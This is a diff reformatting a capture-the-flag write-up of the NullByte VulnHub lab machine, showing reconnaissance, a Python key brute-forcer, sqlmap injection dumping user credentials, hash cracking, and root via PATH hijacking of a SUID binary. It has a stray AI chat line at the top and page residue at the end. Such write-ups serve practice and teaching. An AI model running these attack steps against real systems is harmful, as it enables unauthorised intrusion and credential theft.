@@ -1,3 +1,5 @@
+Okay, I understand. I will provide the writeup directly in this response.
+
 # NullByte VulnHub Challenge Writeup
 
 ## Overview
@@ -10,9 +12,9 @@ NullByte is a VulnHub machine that involves network reconnaissance, web enumerat
 
 First, I identified the target machine on the network using `netdiscover`:
 
-\`\`\`bash
+```shellscript
 netdiscover -r 192.168.1.0/24
-\`\`\`
+```
 
 The target machine was identified at `192.168.1.142` with MAC Address `08:00:27:96:30:FD` (PCS Systemtechnik/Oracle VirtualBox virtual NIC).
 
@@ -20,21 +22,23 @@ The target machine was identified at `192.168.1.142` with MAC Address `08:00:27:
 
 Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions:
 
-\`\`\`bash
+```shellscript
 nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.142 -p-
-\`\`\`
+```
 
 **Results:**
--   **80/tcp**: `http` Apache httpd 2.4.10 ((Debian))
--   **111/tcp**: `rpcbind` 2-4 (RPC #100000)
--   **777/tcp**: `ssh` OpenSSH 6.7p1 Debian 5 (protocol 2.0)
--   **33624/tcp**: `status` 1 (RPC #100024)
+
+- **80/tcp**: `http` Apache httpd 2.4.10 ((Debian))
+- **111/tcp**: `rpcbind` 2-4 (RPC `#100000`)
+- **777/tcp**: `ssh` OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+- **33624/tcp**: `status` 1 (RPC `#100024`)
+
 
 I attempted to connect to port 33624 using `nc`, but it did not yield any immediate useful information.
 
-\`\`\`bash
+```shellscript
 nc 192.168.1.142 33624
-\`\`\`
+```
 
 ## Web Enumeration
 
@@ -42,41 +46,45 @@ I used `gobuster` to enumerate directories and files on the web server running o
 
 ### Directory Enumeration
 
-\`\`\`bash
+```shellscript
 gobuster dir -u http://192.168.1.142/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-\`\`\`
+```
 
 **Results:**
--   `/uploads` (Status: 301)
--   `/javascript` (Status: 301)
--   `/phpmyadmin` (Status: 301)
--   `/server-status` (Status: 403)
+
+- `/uploads` (Status: 301)
+- `/javascript` (Status: 301)
+- `/phpmyadmin` (Status: 301)
+- `/server-status` (Status: 403)
+
 
 I also ran `gobuster` with a common wordlist:
 
-\`\`\`bash
+```shellscript
 gobuster dir -u http://192.168.1.142/ -w ../../wordlists/common.txt
-\`\`\`
+```
 
 This confirmed the previous findings and added `/index.html`.
 
 ### File Enumeration
 
-\`\`\`bash
+```shellscript
 gobuster dir -u http://192.168.1.142/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
-\`\`\`
+```
 
 **Results:**
--   `/index.html` (Status: 200)
--   Other files like `.htaccess`, `.htpasswd` returned 403 Forbidden.
 
-### Enumerating `/uploads` Directory
+- `/index.html` (Status: 200)
+- Other files like `.htaccess`, `.htpasswd` returned 403 Forbidden.
+
+
+### Enumerating `/uploads`Directory
 
 I then focused on the `/uploads` directory:
 
-\`\`\`bash
+```shellscript
 gobuster dir -u http://192.168.1.142/uploads/ -w ../../wordlists/common.txt
-\`\`\`
+```
 
 This revealed `/uploads/index.html` (Status: 200). Further enumeration with `directory-list-2.3-medium.txt` on `/uploads` did not reveal new directories.
 
@@ -86,26 +94,29 @@ I noticed a `main.gif` file in my current directory. I performed some analysis o
 
 ### Strings Analysis
 
-\`\`\`bash
+```shellscript
 strings main.gif | head
-\`\`\`
-\`\`\`bash
+```
+
+```shellscript
 strings main.gif | head -n 50
-\`\`\`
-\`\`\`bash
+```
+
+```shellscript
 strings main.gif | tail -n 30
-\`\`\`
+```
 
 The `strings` command revealed a peculiar string: `P-): kzMb5nVYJw`. This looked like a potential key or hidden path.
 
 ### Binwalk and Exiftool
 
-\`\`\`bash
+```shellscript
 binwalk main.gif
-\`\`\`
-\`\`\`bash
+```
+
+```shellscript
 exiftool main.gif
-\`\`\`
+```
 
 `exiftool` confirmed the `Comment` field contained `P-): kzMb5nVYJw`. This strongly suggested it was a hidden directory or parameter.
 
@@ -115,9 +126,30 @@ Based on the `kzMb5nVYJw` string, I tried navigating to `http://192.168.1.142/kz
 
 ### Brute-forcing the Key
 
-The screenshot `bruteforce-elite.png` shows a Python script being used to brute-force a key for `index.php`. The script successfully found the key `elite`.
+The following image shows a Python script being used to brute-force a key for `index.php`. The script successfully found the key `elite`.
 
-<img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot_2025-07-12_06-36-26-1OYHOEb9yHeoaVns8Bt0Jp65SDuBeZ.png" alt="Python script brute-forcing key to 'elite'" width="800" />
+
+<img width="1266" height="705" alt="image" src="https://github.com/user-attachments/assets/6e5e799a-b837-49f8-a375-b7949c5e51dc" />
+
+```python
+import requests
+
+url = "http://192.168.1.142/kzMb5nVYJw/index.php"
+i=0
+
+with open("/usr/share/wordlists/rockyou.txt","r") as file:
+    for line in file:
+        i+=1
+        key = line.strip()
+        print(f"[*] Testing key {i:6}: ",key)
+        data = {
+            "key":key
+        }
+        res = requests.post(url,data=data)
+        if "invalid" not in res.text:
+            print("[+] Found key : ",key)
+            break
+``` 
 
 This implies that `index.php` likely takes a `key` parameter. I tested this with `sqlmap`.
 
@@ -125,9 +157,9 @@ This implies that `index.php` likely takes a `key` parameter. I tested this with
 
 I attempted to use `sqlmap` on `http://192.168.1.142/kzMb5nVYJw/index.php` with a POST request, providing `key=test` as data.
 
-\`\`\`bash
+```shellscript
 sqlmap -u "http://192.168.1.142/kzMb5nVYJw/index.php" --data="key=test" --batch --level=5 --risk=3
-\`\`\`
+```
 
 `sqlmap` reported that the POST parameter 'key' did not appear to be injectable. This means the `index.php` page itself might not be vulnerable to SQL injection via the `key` parameter.
 
@@ -135,16 +167,18 @@ sqlmap -u "http://192.168.1.142/kzMb5nVYJw/index.php" --data="key=test" --batch 
 
 Further investigation (or perhaps navigating the web application) would reveal `420search.php` within the `kzMb5nVYJw` directory. This page likely takes a `usrtosearch` GET parameter. I tested this with `sqlmap`.
 
-\`\`\`bash
+```shellscript
 sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --level=5 --risk=3
-\`\`\`
+```
 
 **Results:**
 `sqlmap` successfully identified multiple injection points for the `usrtosearch` GET parameter, including:
--   Boolean-based blind
--   Error-based
--   Time-based blind
--   UNION query (3 columns)
+
+- Boolean-based blind
+- Error-based
+- Time-based blind
+- UNION query (3 columns)
+
 
 The backend DBMS was identified as **MySQL >= 5.5** running on **Linux Debian 8 (jessie)** with **Apache 2.4.10**.
 
@@ -152,40 +186,45 @@ The backend DBMS was identified as **MySQL >= 5.5** running on **Linux Debian 8 
 
 I used `sqlmap` to list the available databases:
 
-\`\`\`bash
+```shellscript
 sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --dbs
-\`\`\`
+```
 
 **Available Databases:**
--   `information_schema`
--   `mysql`
--   `performance_schema`
--   `phpmyadmin`
--   `seth`
+
+- `information_schema`
+- `mysql`
+- `performance_schema`
+- `phpmyadmin`
+- `seth`
+
 
 The `seth` database looked promising.
 
-### Enumerating Tables in `seth` Database
+### Enumerating Tables in `seth`Database
 
 I enumerated tables within the `seth` database:
 
-\`\`\`bash
+```shellscript
 sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --tables -D seth
-\`\`\`
+```
 
 **Table in `seth` database:**
--   `users`
+
+- `users`
+
 
 ### Dumping Data from `seth.users`
 
 I dumped the data from the `users` table in the `seth` database:
 
-\`\`\`bash
+```shellscript
 sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --dump -D seth -T users
-\`\`\`
+```
 
 **Dumped Data:**
-\`\`\`
+
+```plaintext
 Database: seth
 Table: users
 [2 entries]
@@ -195,63 +234,72 @@ Table: users
 | 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
 | 2  | --not allowed--                             | isis   | employee   |
 +----+---------------------------------------------+--------+------------+
-\`\`\`
+```
 
 We obtained a hash for the user `ramses`: `YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE`.
 
-### Enumerating `phpmyadmin` Database (Optional)
+### Enumerating `phpmyadmin`Database (Optional)
 
 I also checked the `phpmyadmin` database for tables, but it didn't yield immediately useful credentials.
 
-\`\`\`bash
+```shellscript
 sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --tables -D phpmyadmin
-\`\`\`
+```
 
 ## Password Cracking
 
 I saved the hash for `ramses` to a file and used `hashid` to identify its type, then `john` to crack it.
 
-\`\`\`bash
+```shellscript
 echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" > hash.txt
 hashid "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE"
-\`\`\`
+```
 
 `hashid` initially suggested "Cisco-IOS(SHA-256)" and "Cisco Type 4". However, the hash format `YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE` looks like a Base64 encoded string.
 
 Decoding the Base64 string:
-\`\`\`bash
+
+```shellscript
 echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" | base64 -d
-\`\`\`
+```
+
 Result: `c6d6bd7ebf806f43c76acc3681703b81`
 
 Now, identifying the type of the decoded hash:
-\`\`\`bash
+
+```shellscript
 hashid "c6d6bd7ebf806f43c76acc3681703b81"
-\`\`\`
+```
+
 This hash was identified as MD5, among others.
 
 I then used `john` with the `rockyou.txt` wordlist to crack the MD5 hash:
 
-\`\`\`bash
+```shellscript
 echo "c6d6bd7ebf806f43c76acc3681703b81" > hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-\`\`\`
+```
 
 The hash `c6d6bd7ebf806f43c76acc3681703b81` was successfully cracked to `omega`.
 
-<img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot_2025-07-12_06-41-46-UT72poggITCW2jo37TIowTrmREEnNU.png" alt="CrackStation cracking MD5 hash to 'omega'" width="800" />
+
+<img width="1211" height="559" alt="image" src="https://github.com/user-attachments/assets/059ca024-6250-4fc2-b671-076c0a7de56b" />
+
+
 
 **Credentials:**
--   **User**: `ramses`
--   **Password**: `omega`
+
+- **User**: `ramses`
+- **Password**: `omega`
+
 
 ## SSH Access
 
 I attempted to SSH into the machine as `ramses` using the cracked password. The `nmap` scan showed SSH running on port 777, not the default port 22.
 
-\`\`\`bash
+```shellscript
 ssh ramses@192.168.1.142 -p 777
-\`\`\`
+```
 
 I successfully logged in as `ramses`.
 
@@ -259,22 +307,23 @@ I successfully logged in as `ramses`.
 
 Once logged in, I checked the current directory and tried to use `sudo -l`:
 
-\`\`\`bash
+```shellscript
 ramses@NullByte:~$ ls -la
-\`\`\`
-\`\`\`bash
+```
+
+```shellscript
 ramses@NullByte:~$ sudo -l
 [sudo] password for ramses:
 Sorry, user ramses may not run sudo on NullByte.
-\`\`\`
+```
 
 The `sudo -l` command indicated that `ramses` cannot run `sudo`.
 
 I checked the `.bash_history` for clues:
 
-\`\`\`bash
+```shellscript
 ramses@NullByte:~$ cat .bash_history
-\`\`\`
+```
 
 The history showed some interesting commands, including `cd /var/www`, `cd backup/`, `ls`, `./procwatch`, `sudo -s`. This suggested that `/var/www/backup/procwatch` might be an interesting file.
 
@@ -284,21 +333,24 @@ The history showed some interesting commands, including `cd /var/www`, `cd backu
 
 I searched for SUID binaries on the system:
 
-\`\`\`bash
+```shellscript
 find / -perm -4000 2> /dev/null
-\`\`\`
+```
 
 **Key finding:**
--   `/var/www/backup/procwatch`
+
+- `/var/www/backup/procwatch`
+
 
 I checked the permissions of `procwatch`:
 
-\`\`\`bash
+```shellscript
 ls -la /var/www/backup/procwatch
-\`\`\`
-\`\`\`
+```
+
+```plaintext
 -rwsr-xr-x 1 root root 4932 Aug  2  2015 /var/www/backup/procwatch
-\`\`\`
+```
 
 The `s` permission bit (`-rws`) indicates that `procwatch` is a SUID binary, meaning it runs with the permissions of its owner (`root`).
 
@@ -306,66 +358,76 @@ The `s` permission bit (`-rws`) indicates that `procwatch` is a SUID binary, mea
 
 When `procwatch` is executed, it seems to run `ps` command. This is a classic scenario for PATH hijacking. If we can control the `PATH` environment variable, we can make `procwatch` execute our own `ps` script instead of the legitimate `/bin/ps`.
 
-1.  **Create a malicious `ps` script:**
-    I created a file named `ps` in the `/var/www/backup/` directory (or any directory writable by `ramses` that can be added to `PATH`).
+1. **Create a malicious `ps` script:**
+I created a file named `ps` in the `/var/www/backup/` directory (or any directory writable by `ramses` that can be added to `PATH`).
 
-    \`\`\`bash
-    ramses@NullByte:/var/www/backup$ vi ps
-    \`\`\`
+```shellscript
+ramses@NullByte:/var/www/backup$ vi ps
+```
 
-    Content of `ps`:
-    \`\`\`bash
-    #!/bin/sh
-    /bin/sh
-    \`\`\`
+Content of `ps`:
 
-    This script simply executes `/bin/sh`, which should give us a shell.
+```shellscript
+#!/bin/sh
+/bin/sh
+```
 
-2.  **Make the script executable:**
-    \`\`\`bash
-    ramses@NullByte:/var/www/backup$ chmod +x ps
-    \`\`\`
+This script simply executes `/bin/sh`, which should give us a shell.
 
-3.  **Modify `PATH` and execute `procwatch`:**
-    I added the current directory (`/var/www/backup`) to the `PATH` environment variable so that our malicious `ps` script would be found before `/bin/ps`.
 
-    \`\`\`bash
-    ramses@NullByte:/var/www/backup$ export PATH=/var/www/backup:$PATH
-    ramses@NullByte:/var/www/backup$ /var/www/backup/procwatch
-    \`\`\`
+2. **Make the script executable:**
 
-    Upon executing `procwatch`, it ran our `ps` script, which in turn executed `/bin/sh`, granting us a root shell!
+```shellscript
+ramses@NullByte:/var/www/backup$ chmod +x ps
+```
 
-    \`\`\`
-    # id
-    uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
-    \`\`\`
 
-    The `euid=0(root)` confirms that we have successfully escalated privileges to root.
+3. **Modify `PATH` and execute `procwatch`:**
+I added the current directory (`/var/www/backup`) to the `PATH` environment variable so that our malicious `ps` script would be found before `/bin/ps`.
+
+```shellscript
+ramses@NullByte:/var/www/backup$ export PATH=/var/www/backup:$PATH
+ramses@NullByte:/var/www/backup$ /var/www/backup/procwatch
+```
+
+Upon executing `procwatch`, it ran our `ps` script, which in turn executed `/bin/sh`, granting us a root shell!
+
+```plaintext
+# id
+uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
+```
+
+The `euid=0(root)` confirms that we have successfully escalated privileges to root.
+
+
+
 
 ## Root Flag
 
 Finally, I navigated to the `/root` directory to find the `proof.txt` file.
 
-\`\`\`bash
+```shellscript
 # cd /root
 # ls
 proof.txt
 # cat proof.txt
-\`\`\`
+```
 
 **Root Flag:** `adf11c7a9e6523e630aaf3b9b7acb51d`
 
 The `proof.txt` also contained a message:
-\`\`\`
+
+```plaintext
 It seems that you have pwned the box, congrats. Now you done that I wanna talk with you. Write a walk & mail atxly0n@sigaint.org attach the walk and proof.txt
 If sigaint.org is down you may mail at nbsly0n@gmail.com
 USE THIS PGP PUBLIC KEY
 -----BEGIN PGP PUBLIC KEY BLOCK-----
 ... (PGP key content) ...
 -----END PGP PUBLIC KEY BLOCK-----
-\`\`\`
+```
 
 ## Conclusion
 
 The NullByte challenge was a great exercise in common penetration testing techniques, including network and web enumeration, SQL injection to extract credentials, and a classic PATH hijacking vulnerability for privilege escalation.
+
+SuggestionsClose suggestions[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}Add IntegrationExplore other VulnHub challengesLearn more about SUID binariesPractice SQL injection techniquesAutomate reconnaissance stepsResearch different shell typesScroll leftScroll right
